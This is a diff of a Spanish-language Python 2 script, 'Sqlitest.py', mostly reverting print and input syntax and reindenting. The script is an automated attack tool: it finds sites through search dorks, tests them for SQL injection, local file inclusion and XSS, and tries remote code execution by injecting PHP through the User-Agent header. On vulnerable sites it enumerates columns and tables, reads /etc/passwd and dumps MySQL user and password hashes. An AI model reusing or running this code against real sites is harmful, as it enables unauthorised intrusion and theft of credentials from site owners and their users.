@@ -1,11 +1,9 @@
-#!/usr/bin/python
+#!/usr/bin/python2
 #-*- coding: UTF-8 -*-
 # This was written for educational purpose and pentest only. Use it at your own risk.
 # Author will be not responsible for any damage!
 
-#import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, subprocess
-import string, sys, time, urllib, re, random, threading, socket, os, subprocess
-
+import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, subprocess
 from random import choice
 
 # Colours
@@ -17,13 +15,13 @@ B  = "\033[34m";
 
 # Banner
 def logo():
-    print (R+"\n|---------------------------------------------------------------|")
-    print ("|         Programador: Eduard Eliecer Tolosa Toloza                 |")
-    print ("|               XMPP/Email: tolosaeduard@cock.lu                    |")
-    print ("|                      Sqlitest.py  v 1.0                           |")
-    print ("|             Security Hack Labs Team @SecHackLabs                  |")
-    print ("|-------------------------------------------------------------------|\n")
-    print (W)
+	print R+"\n|---------------------------------------------------------------|"
+        print "|         Programador: Eduard Eliecer Tolosa Toloza                 |"
+        print "|               XMPP/Email: tolosaeduard@cock.lu                    |"
+        print "|                      Sqlitest.py  v 1.0                           |"
+        print "|             Security Hack Labs Team @SecHackLabs                  |"
+        print "|-------------------------------------------------------------------|\n"
+	print W
 
 if sys.platform == 'linux' or sys.platform == 'linux2':
   subprocess.call("clear", shell=True)
@@ -149,44 +147,46 @@ def search(inurl, maxc):
     page = 0
     try:
       while page < int(maxc):
-          jar = cookielib.FileCookieJar("cookies")
-          query = inurl+"+site:"+site
-          results_web = 'http://www.search-results.com/web?q='+query+'&hl=en&page='+repr(page)+'&src=hmp'
-          request_web =urllib2.Request(results_web)
-          agent = random.choice(header)
-          request_web.add_header('User-Agent', agent)
-          opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
-          text = opener_web.open(request_web).read()
-          stringreg = re.compile('(?<=href=")(.*?)(?=")')
-          names = stringreg.findall(text)
-          page += 1
-          for name in names:
-              if name not in urls:
-                  if re.search(r'\(',name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
-                      pass
-                  elif re.search("google",name) or re.search("youtube", name) or re.search("phpbuddy", name) or re.search("iranhack",name) or re.search("phpbuilder",name) or re.search("codingforums", name) or re.search("phpfreaks", name) or re.search("%", name) or re.search("facebook", name) or re.search("twitter", name):
-                      pass
-                  else:
-                      urls.append(name)
-                      percent = int((1.0*page/int(maxc))*100)
-                      urls_len = len(urls)
-                      sys.stdout.write("\rSite: %s | Collected urls: %s | Percent Done: %s | Current page no.: %s <> " % (site,repr(urls_len),repr(percent),repr(page)))
-                      sys.stdout.flush()
+	jar = cookielib.FileCookieJar("cookies")
+	query = inurl+"+site:"+site
+	results_web = 'http://www.search-results.com/web?q='+query+'&hl=en&page='+repr(page)+'&src=hmp'
+	request_web =urllib2.Request(results_web)
+	agent = random.choice(header)
+	request_web.add_header('User-Agent', agent)
+	opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
+	text = opener_web.open(request_web).read()
+	stringreg = re.compile('(?<=href=")(.*?)(?=")')
+        names = stringreg.findall(text)
+        page += 1
+        for name in names:
+	  if name not in urls:
+	    if re.search(r'\(',name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
+	      pass
+	    elif re.search("google",name) or re.search("youtube", name) or re.search("phpbuddy", name) or re.search("iranhack",name) or re.search("phpbuilder",name) or re.search("codingforums", name) or re.search("phpfreaks", name) or re.search("%", name) or re.search("facebook", name) or re.search("twitter", name):
+	      pass
+	    else:
+	      urls.append(name)
+	percent = int((1.0*page/int(maxc))*100)
+	urls_len = len(urls)
+	sys.stdout.write("\rSite: %s | Collected urls: %s | Percent Done: %s | Current page no.: %s <> " % (site,repr(urls_len),repr(percent),repr(page)))
+	sys.stdout.flush()
     except(KeyboardInterrupt):
       pass
   tmplist = []
-  print ("\n\n[+] URLS (Sin Clasificar): ",len(urls))
+  print "\n\n[+] URLS (Sin Clasificar): ",len(urls)
   for url in urls:
     try:
       host = url.split("/",3)
       domain = host[2]
       if domain not in tmplist and "=" in url:
-          finallist.append(url)
-          tmplist.append(domain)
+	finallist.append(url)
+	tmplist.append(domain)
+	
     except:
-        pass
-    print ("[+] URLS (Clasificada)  : ",len(finallist))
-    return finallist
+      pass
+  print "[+] URLS (Clasificada)  : ",len(finallist)
+  return finallist
+ 
   
 class injThread(threading.Thread):
         def __init__(self,hosts):
@@ -262,11 +262,11 @@ def ClassicINJ(url):
                 source = urllib2.urlopen(host).read()
                 for type,eMSG in sqlerrors.items():
                         if re.search(eMSG, source):
-                                print (R+"[!] w00t!,w00t!:", O+host, B+"Error:", type,R+" ---> Inyeccion SQL encontrada")
-                                logfile.write("\n"+host)
-                                vuln.append(host)
-                                col.append(host)
-                                break
+                                print R+"[!] w00t!,w00t!:", O+host, B+"Error:", type,R+" ---> Inyeccion SQL encontrada"
+				logfile.write("\n"+host)
+				vuln.append(host)
+				col.append(host)
+				break
 				
 				
                         else:
@@ -283,23 +283,23 @@ def ClassicLFI(url):
     try:
       check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
       if re.findall("root:x", check):
-        print (R+"[!] w00t!,w00t!: ", O+lfiurl+lfi,R+" ---> Inclusión Local de Archivos encontrada")
-        lfi_log_file.write("\n"+lfiurl+lfi)
-        vuln.append(lfiurl+lfi)
-        target = lfiurl+lfi
-        target = target.replace("/etc/passwd","/proc/self/environ")
-        header = "<? echo md5(sechacklabs); ?>"
+	print R+"[!] w00t!,w00t!: ", O+lfiurl+lfi,R+" ---> Arhchivos localaes Include encontrados"
+	lfi_log_file.write("\n"+lfiurl+lfi)
+	vuln.append(lfiurl+lfi)
+	target = lfiurl+lfi
+	target = target.replace("/etc/passwd","/proc/self/environ")
+	header = "<? echo md5(sechacklabs); ?>"
         try:
-            request_web = urllib2.Request(target)
-            request_web.add_header('User-Agent', header)
-            text = urllib2.urlopen(request_web)
-            text = text.read()
-            if re.findall("f17f4b3e8e709cd3c89a6dbd949d7171", text):
-                print (R+"[!] w00t!,w00t!: ",O+target,R+" ---> LFI o RCE Encontrado")
-                rce_log_file.write("\n",target)
-                vuln.append(target)
+	  request_web = urllib2.Request(target)
+	  request_web.add_header('User-Agent', header)
+	  text = urllib2.urlopen(request_web)
+	  text = text.read()
+	  if re.findall("f17f4b3e8e709cd3c89a6dbd949d7171", text):
+	    print R+"[!] w00t!,w00t!: ",O+target,R+" ---> de LFI a RCE Encontrado"
+	    rce_log_file.write("\n",target)
+	    vuln.append(target)
         except:
-            pass
+	  pass
 	
     except:
       pass
@@ -309,16 +309,16 @@ def ClassicXSS(url):
     try:
       source = urllib2.urlopen(url+xss.replace("\n","")).read()
       if re.findall("XSS by sechacklabs", source):
-        print (R+"[!] w00t!,w00t!: ", O+url+xss,R+" ---> XSS Encontrado (podria ser falso)")
-        xss_log_file.write("\n"+url+xss)
-        vuln.append(url+xss)
+	print R+"[!] w00t!,w00t!: ", O+url+xss,R+" ---> XSS Encontrado (podria ser falso)"
+	xss_log_file.write("\n"+url+xss)
+	vuln.append(url+xss)
     except:
       pass
  
 def injtest():
-  print (B+"\n[+] Preparando para escaneo SQLi ...")
-  print ("[+] Puede tomar un tiempo ...")
-  print ("[!] Trabajando  ...\n")
+  print B+"\n[+] Preparando para escaneo SQLi ..."
+  print "[+] Puede tomar un tiempo ..."
+  print "[!] Trabajando  ...\n"
   i = len(usearch) / int(numthreads)
   m = len(usearch) % int(numthreads)
   z = 0
@@ -326,8 +326,8 @@ def injtest():
     for x in range(0, int(numthreads)):
       sliced = usearch[x*i:(x+1)*i]
       if (z<m):
-        sliced.append(usearch[int(numthreads)*i+z])
-        z +=1
+	sliced.append(usearch[int(numthreads)*i+z])
+	z +=1
       thread = injThread(sliced)
       thread.start()
       threads.append(thread)
@@ -335,9 +335,9 @@ def injtest():
       thread.join()
       
 def lfitest():
-  print (B+"\n[+] Preparando para escaneo LFI - RCE ...")
-  print ("[+] Puede tomar un tiempo ...")
-  print ("[!] Trabajando  ...\n")
+  print B+"\n[+] Preparando para escaneo LFI - RCE ..."
+  print "[+] Puede tomar un tiempo ..."
+  print "[!] Trabajando  ...\n"
   i = len(usearch) / int(numthreads)
   m = len(usearch) % int(numthreads)
   z = 0
@@ -345,8 +345,8 @@ def lfitest():
     for x in range(0, int(numthreads)):
       sliced = usearch[x*i:(x+1)*i]
       if (z<m):
-        sliced.append(usearch[int(numthreads)*i+z])
-        z +=1
+	sliced.append(usearch[int(numthreads)*i+z])
+	z +=1
       thread = lfiThread(sliced)
       thread.start()
       threads.append(thread)
@@ -354,9 +354,9 @@ def lfitest():
       thread.join()
  
 def xsstest():
-  print (B+"\n[+] Preparando para escaneo XSS ...")
-  print ("[+] Puede tomar un tiempo ...")
-  print ("[!] Trabajando  ...\n")
+  print B+"\n[+] Preparando para escaneo XSS ..."
+  print "[+] Puede tomar un tiempo ..."
+  print "[!] Trabajando  ...\n"
   i = len(usearch) / int(numthreads)
   m = len(usearch) % int(numthreads)
   z = 0
@@ -364,8 +364,8 @@ def xsstest():
     for x in range(0, int(numthreads)):
       sliced = usearch[x*i:(x+1)*i]
       if (z<m):
-        sliced.append(usearch[int(numthreads)*i+z])
-        z +=1
+	sliced.append(usearch[int(numthreads)*i+z])
+	z +=1
       thread = xssThread(sliced)
       thread.start()
       threads.append(thread)
@@ -375,82 +375,82 @@ def xsstest():
 def sitek():
     try:        
         global sitekey
-        sitekey = input("\nIntroduce tu objetivo, (Si tu no conoces introduce el 1) :  ")
+        sitekey = raw_input("\nIntroduce tu objetivo, (Si tu no conoces introduce el 1) :  ")
         if sitekey == "":
-            print ("Introduce un objetivo valido (1-5), el objetivo no puede estar vacio.")
+            print "Introduce un objetivo valido (1-5), el objetivo no puede estar vacio."
             sitek()
         elif sitekey not in {'1', '2', '3', '4', '5'}:
-            print ("Introduce un objetivo valido (1-5)")
+            print "Introduce un objetivo valido (1-5)"
             sitek()
         else:
             return sitekey
     except KeyboardInterrupt:
-        print ("Regresando al menu anterior.")
+        print "Regresando al menu anterior."
     except:
-        print ("Ha ocurrido un error, regresando al menu anterior.")
+        print "Ha ocurrido un error, regresando al menu anterior."
 
 def sitedom():
     try:
         global sitedomain
-        sitedomain=input("\nIntroduce un dominio especifico (Ejemplo: com, net, org ...) si quieres buscar en multiples dominios, separalos con comas : ")
+        sitedomain=raw_input("\nIntroduce un dominio especifico (Ejemplo: com, net, org ...) si quieres buscar en multiples dominios, separalos con comas : ")
         if sitedomain == "":
-            print ("El dominio no puede estar vacio.")
+            print "El dominio no puede estar vacio."
             sitedom()
         else:
             return sitedomain
     except KeyboardInterrupt:
-        print ("Regresando al menu anterior.")
+        print "Regresando al menu anterior."
     except:
-        print ("Ha ocurrido un error, regresando al menu anterior.")
+        print "Ha ocurrido un error, regresando al menu anterior."
 
 def dorkk():
     try:
         global inurl
-        inurl=input("\nIntroduce tu dork ( Un dork es similar a php?id= ), si deseas ver una URL con ejemplos de dorks, escriba 'urldorks' si quieres obtener la lista de dorks en una URL: ")
+        inurl=raw_input("\nIntroduce tu dork ( Un dork es similar a php?id= ), si deseas ver una URL con ejemplos de dorks, escriba 'urldorks' si quieres obtener la lista de dorks en una URL: ")
         if inurl == "":
-            print ("El dork no puede estar vacio.")
+            print "El dork no puede estar vacio."
             dorkk()
         elif inurl == "urldorks" or inurl == "'urldorks'":
-            print ("\nSubiendo los dorks al paste, por favor abra la URL resultante despues de esto.")
+            print "\nSubiendo los dorks al paste, por favor abra la URL resultante despues de esto."
             os.system("cat modules/vulns/dorks.txt | curl -F 'sprunge=<-' http://sprunge.us")
             dorkk()
         else:
             return inurl
     except KeyboardInterrupt:
-        print ("Regresando al menu anterior.")
+        print "Regresando al menu anterior."
     except:
-        print ("Ha ocurrido un error, regresando al menu anterior.")
+        print "Ha ocurrido un error, regresando al menu anterior."
 
 def thrreads():
     try:
         global numthreads
-        numthreads=input("\nIntroduce el numero de threads (1-10), sino conoces introduce 10 : ")
+        numthreads=raw_input("\nIntroduce el numero de threads (1-10), sino conoces introduce 10 : ")
         if numthreads == "":
-            print ("El numero de threads no puede estar vacio.")
+            print "El numero de threads no puede estar vacio."
             thrreads()
         elif numthreads not in {'1', '2', '3', '4', '5', '6', '7', '8', '9', '10'}:
-            print ("El numero de threads en invalido.")
+            print "El numero de threads en invalido."
             thrreads()
         else:
             return numthreads
     except KeyboardInterrupt:
-        print ("Regresando al menu anterior.")
+        print "Regresando al menu anterior."
     except:
-        print ("Ha ocurrido un error, regresando al menu anterior.")
+        print "Ha ocurrido un error, regresando al menu anterior."
 
 def pagess():
     try:
         global maxc
-        maxc=input("\nIntroduce el numero de paginas en las que deseas buscar, entre mas paginas, mas resultados: ")
+        maxc=raw_input("\nIntroduce el numero de paginas en las que deseas buscar, entre mas paginas, mas resultados: ")
         if maxc == "":
-            print ("El numero de paginas no puede estar vacio.")
+            print "El numero de paginas no puede estar vacio."
             pagess()
         else:
             return maxc
     except KeyboardInterrupt:
-        print ("Regresando al menu anterior.")
+        print "Regresando al menu anterior."
     except:
-        print ("Ha ocurrido un error, regresando al menu anterior.")
+        print "Ha ocurrido un error, regresando al menu anterior."
 
 menu = True
 new = 1
@@ -465,7 +465,7 @@ while menu == True:
     stecnt = 0
     for k,v in domains.items():
       stecnt += 1
-      print (str(stecnt)+" - "+k)
+      print str(stecnt)+" - "+k
     sitek()
     if sitekey == "5":
       sitedom()
@@ -482,152 +482,157 @@ while menu == True:
     dorkk()
     thrreads()
     pagess()
-    print ("\nNumeros de errores SQL         :",len(sqlerrors))
-    print ("Numeros de parches LFI           :",len(lfis))
-    print ("Numeros de cheats XSS            :",len(xsses))
-    print ("Numeros de headers               :",len(header))
-    print ("Numeros de threads               :",numthreads)
-    print ("Numeros de paginas               :",maxc)
-    print ("se acabo el tiempo en segundos   :",timeout)
-    print ("")
+    print "\nNumeros de errores SQL         :",len(sqlerrors)
+    print "Numeros de parches LFI           :",len(lfis)
+    print "Numeros de cheats XSS            :",len(xsses)
+    print "Numeros de headers               :",len(header)
+    print "Numeros de threads               :",numthreads
+    print "Numeros de paginas               :",maxc
+    print "se acabo el tiempo en segundos   :",timeout
+    print ""
   
     usearch = search(inurl,maxc)
     new = 0
   
-  print (R+"\n[0] Salir")
-  print ("[1] SQLi Testing")
-  print ("[2] SQLi Testing Auto Mode")
-  print ("[3] LFI - RCE Testing")
-  print ("[4] XSS Testing")
-  print ("[5] SQLi y LFI - RCE Testing")
-  print ("[6] SQLi y XSS Testing")
-  print ("[7] LFI - RCE y XSS Testing")
-  print ("[8] SQLi,LFI - RCE y XSS Testing")
-  print ("[9] Guardar URL validas en un Archivo")
-  print ("[10] Mostrar URLS validas")
-  print ("[11] Vulnerabilidades encontradas en el ultimo escaneo.")
-  print ("[12] Nuevo Scan\n")
+  print R+"\n[0] Salir"
+  print "[1] SQLi Testing"
+  print "[2] SQLi Testing Auto Mode"
+  print "[3] LFI - RCE Testing"
+  print "[4] XSS Testing"
+  print "[5] SQLi y LFI - RCE Testing"
+  print "[6] SQLi y XSS Testing"
+  print "[7] LFI - RCE y XSS Testing"
+  print "[8] SQLi,LFI - RCE y XSS Testing"
+  print "[9] Guardar URL validas en un Archivo"
+  print "[10] Mostrar URLS validas"
+  print "[11] Vulnerabilidades encontradas en el ultimo escaneo."
+  print "[12] Nuevo Scan\n"
   
-  chce = input(":")
+  chce = raw_input(":")
   if chce == '1':
     injtest()
     
   if chce == '2':
     injtest()
-    print (B+"\n[+] Preparando para escaneo  Column Finder ...")
-    print ("[+] Puede tomar un tiempo ...")
-    print ("[!] Trabajando  ...")
+    print B+"\n[+] Preparando para escaneo  Column Finder ..."
+    print "[+] Puede tomar un tiempo ..."
+    print "[!] Trabajando  ..."
     for host in col:
-      print (R+"\n[+] Target: ", O+host)
-      print (R+"[+] Intentando encontrar el número de columnas ...")
-      print ("[+] Testing: "),
+      print R+"\n[+] Target: ", O+host
+      print R+"[+] Intentando encontrar el número de columnas ..."
+      print "[+] Testing: ",
       checkfor = []
       host = host.rsplit("'", 1)[0]
       sitenew = host+arg_eva+"and"+arg_eva+"1=2"+arg_eva+"union"+arg_eva+"all"+arg_eva+"select"+arg_eva
       makepretty = ""
       for x in xrange(0, colMax):
-        try:
-          sys.stdout.write("%s," % (x))
-          sys.stdout.flush()
-          sechacklabs = "sec"+str(x)+"hacklabs"
-          checkfor.append(sechacklabs)
-          if x > 0:
-              sitenew += ","
-          sitenew += "0x"+sechacklabs.encode("hex")
-          finalurl = sitenew+arg_end
-          gets += 1
-          source = urllib2.urlopen(finalurl).read()
-          for y in checkfor:
-            colFound = re.findall(y, source)
-            if len(colFound) >= 1:
-              print ("\n[+] longitud de la columna es :", len(checkfor))
-              nullcol = re.findall(("\d+"), y)
-              print ("[+] Encontrado columna nula en la columna #:", nullcol[0])
-              for z in xrange(0, len(checkfor)):
-                if z > 0:
-                    makepretty += ","
-                makepretty += str(z)
-              site = host+arg_eva+"and"+arg_eva+"1=2"+arg_eva+"union"+arg_eva+"all"+arg_eva+"select"+arg_eva+makepretty
-              print ("[+] SQLi URL:", site+arg_end)
-              site = site.replace(","+nullcol[0]+",",",sechacklabs,")
-              site = site.replace(arg_eva+nullcol[0]+",",arg_eva+"sechacklabs,")
-              site = site.replace(","+nullcol[0],",sechacklabs")
-              print ("[+] sechacklabs URL:", site)
-              darkurl.append(site)
-              print ("[-] Done!\n")
-              break
-        except(KeyboardInterrupt, SystemExit):
-              raise
-        except:
-            pass
+	try:
+	  sys.stdout.write("%s," % (x))
+	  sys.stdout.flush()
+	  sechacklabs = "sec"+str(x)+"hacklabs"
+	  checkfor.append(sechacklabs)
+	  if x > 0:
+	    sitenew += ","
+	  sitenew += "0x"+sechacklabs.encode("hex")
+	  finalurl = sitenew+arg_end
+	  gets += 1
+	  source = urllib2.urlopen(finalurl).read()
+	  for y in checkfor:
+	    colFound = re.findall(y, source)
+	    if len(colFound) >= 1:
+	      print "\n[+] longitud de la columna es :", len(checkfor)
+	      nullcol = re.findall(("\d+"), y)
+	      print "[+] Encontrado columna nula en la columna #:", nullcol[0]
+	      for z in xrange(0, len(checkfor)):
+		if z > 0:
+		  makepretty += ","
+		makepretty += str(z)
+	      site = host+arg_eva+"and"+arg_eva+"1=2"+arg_eva+"union"+arg_eva+"all"+arg_eva+"select"+arg_eva+makepretty
+	      print "[+] SQLi URL:", site+arg_end
+	      site = site.replace(","+nullcol[0]+",",",sechacklabs,")
+	      site = site.replace(arg_eva+nullcol[0]+",",arg_eva+"sechacklabs,")
+	      site = site.replace(","+nullcol[0],",sechacklabs")
+	      print "[+] sechacklabs URL:", site
+	      darkurl.append(site)
+	      print "[-] Done!\n"
+	      break
+	      
+	except(KeyboardInterrupt, SystemExit):
+	  raise
+	except:
+	  pass
       
-      print ("\n[!] Lo sentimos la longitud de la columna no se pudo encontrar\n")
+      print "\n[!] Lo sentimos la longitud de la columna no se pudo encontrar\n"
       
       
       #########
     
-    print (B+"\n[+] Recopilacion de la configuracion de MYSQL Server...")
+    print B+"\n[+] Recopilacion de la configuracion de MYSQL Server..."
     for site in darkurl:
       head_URL = site.replace("sechacklabs", "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
-      print (R+"\n[+] Target:", O+site)
+      print R+"\n[+] Target:", O+site
       while 1:
-        try:
-          gets += 1
-          source = urllib2.urlopen(head_URL).read()
-          match = re.findall("\x1e\x1e\S+", source)
-          if len(match) >= 1:
-            match = match[0][2:].split("\x1e")
-            version = match[0]
-            user = match[1]
-            database = match[2]
-            print (W+"\n\tDatabase:", database)
-            print ("\tUser:", user)
-            print ("\tVersion:", version)
-            version = version[0]
-            
-            load = site.replace("sechacklabs", "load_file(0x2f6574632f706173737764)")
-            source = urllib2.urlopen(load).read()
-            if re.findall("root:x", source):
-              load = site.replace("sechacklabs","concat_ws(char(58),load_file(0x"+file.encode("hex")+"),0x62616c74617a6172)")
-              source = urllib2.urlopen(load).read()
-              search = re.findall("sechacklabs",source)
-              if len(search) > 0:
-                  print ("\n[!] w00t!w00t!: "+site.replace("sechacklabs", "load_file(0x"+file.encode("hex")+")"))
-            load = site.replace("sechacklabs", "concat_ws(char(58),user,password,0x62616c74617a6172)")+arg_eva+"from"+arg_eva+"mysql.user"
-            source = urllib2.urlopen(load).read()
-            if re.findall("sechacklabs", source):
-                print ("\n[!] w00t!w00t!: "+site.replace("sechacklabs", "concat_ws(char(58),user,password)")+arg_eva+"from"+arg_eva+"mysql.user")
-          print (W+"\n[+] Numero de tablas:",len(tables))
-          print ("[+] Numero de columnas:",len(columns))
-          print ("[+] Verificando por tablas y columnas...")
+	try:
+	  gets += 1
+	  source = urllib2.urlopen(head_URL).read()
+	  match = re.findall("\x1e\x1e\S+", source)
+	  if len(match) >= 1:
+	    match = match[0][2:].split("\x1e")
+	    version = match[0]
+	    user = match[1]
+	    database = match[2]
+	    print W+"\n\tDatabase:", database
+	    print "\tUser:", user
+	    print "\tVersion:", version
+	    version = version[0]
+	  
+	    load = site.replace("sechacklabs", "load_file(0x2f6574632f706173737764)")
+	    source = urllib2.urlopen(load).read()
+	    if re.findall("root:x", source):
+	      load = site.replace("sechacklabs","concat_ws(char(58),load_file(0x"+file.encode("hex")+"),0x62616c74617a6172)")
+	      source = urllib2.urlopen(load).read()
+	      search = re.findall("sechacklabs",source)
+	      if len(search) > 0:
+		print "\n[!] w00t!w00t!: "+site.replace("sechacklabs", "load_file(0x"+file.encode("hex")+")")
+	   
+	    load = site.replace("sechacklabs", "concat_ws(char(58),user,password,0x62616c74617a6172)")+arg_eva+"from"+arg_eva+"mysql.user"
+	    source = urllib2.urlopen(load).read()
+	    if re.findall("sechacklabs", source):
+	      print "\n[!] w00t!w00t!: "+site.replace("sechacklabs", "concat_ws(char(58),user,password)")+arg_eva+"from"+arg_eva+"mysql.user"
+	  
+	  print W+"\n[+] Numero de tablas:",len(tables)
+	  print "[+] Numero de columnas:",len(columns)
+          print "[+] Verificando por tablas y columnas..."
           target = site.replace("sechacklabs", "0x62616c74617a6172")+arg_eva+"from"+arg_eva+"T"
-          for table in tables:
+	  for table in tables:
             try:
-              target_table = target.replace("T", table)
-              source = urllib2.urlopen(target_table).read()
-              search = re.findall("sechacklabs", source)
-              if len(search) > 0:
-                print ("\n[!] w00t!w00t! Found a table called: < "+table+" >")
-                print ("\n[+] Lets check for columns inside table < "+table+" >")
-                for column in columns:
-                  try:
-                    source = urllib2.urlopen(target_table.replace("0x62616c74617a6172", "concat_ws(char(58),0x62616c74617a6172,"+column+")")).read()
-                    search = re.findall("sechacklabs", source)
-                    if len(search) > 0:
-                        print ("\t[!] w00t!w00t! Encontrada una columna llamada: < "+column+" >")
-                  except(KeyboardInterrupt, SystemExit):
-                      raise
-                  except(urllib2.URLErrr, socket.gaierror, socket.error, socket.timeout):
-                      pass
-                print ("\n[-] Hecho! buscando dentro de la tabla < "+table+" > for columns!")
-            except(KeyboardInterrupt, SystemExit):
-                raise
-            except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
-                pass
-          print ("[!] Fuzzing terminado!")
-          break	  
-        except(KeyboardInterrupt, SystemExit):
-            raise
+	      target_table = target.replace("T", table)
+	      source = urllib2.urlopen(target_table).read()
+	      search = re.findall("sechacklabs", source)
+	      if len(search) > 0:
+		print "\n[!] w00t!w00t! Found a table called: < "+table+" >"
+		print "\n[+] Lets check for columns inside table < "+table+" >"
+		for column in columns:
+		  try:
+		    source = urllib2.urlopen(target_table.replace("0x62616c74617a6172", "concat_ws(char(58),0x62616c74617a6172,"+column+")")).read()
+		    search = re.findall("sechacklabs", source)
+		    if len(search) > 0:
+		      print "\t[!] w00t!w00t! Encontrada una clumna llamada: < "+column+" >"
+		  except(KeyboardInterrupt, SystemExit):
+		    raise
+		  except(urllib2.URLErrr, socket.gaierror, socket.error, socket.timeout):
+		    pass
+	    
+		print "\n[-] Hecho! buscando dentro de la tabla < "+table+" > for columns!"
+	  
+	    except(KeyboardInterrupt, SystemExit):
+	      raise
+	    except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
+	      pass
+	  print "[!] Fuzzing está terminado!"
+	  break	  
+	except(KeyboardInterrupt, SystemExit):
+	  raise
 	
     
 	
@@ -657,31 +662,32 @@ while menu == True:
     xsstest()
     
   if chce == '9':
-    print (B+"\nGuardando URLS validas ("+str(len(finallist))+") to file")
-    listname = input("Filename: ")
+    print B+"\nGuardando URLS validas ("+str(len(finallist))+") to file"
+    listname = raw_input("Filename: ")
     list_name = open(listname, "w")
     finallist.sort()
     for t in finallist:
       list_name.write(t+"\n")
     list_name.close()
-    print ("Urls guardadas, Porfavor verifica", listname)
+    print "Urls guardadas, Porfavor verifica", listname
    
   if chce == '10':
-    print (W+"\nMostrando URLS validas:\n")
+    print W+"\nMostrando URLS validas:\n"
     finallist.sort()
     for t in finallist:
-      print (B+t)
+      print B+t
       
   if chce == '11':
-    print (B+"\nVuln encontrada ",len(vuln))
+    print B+"\nVuln encontrada ",len(vuln)
     
   if chce == '12':
     new = 1 
-    print (W+"")
+    print W+""
  
   if chce == '0':
-    print (R+"\n[-] Saliendo ...")
+    print R+"\n[-] Saliendo ..."
     mnu = False
-    print (W)
+    print W
     sys.exit(1)
+
 
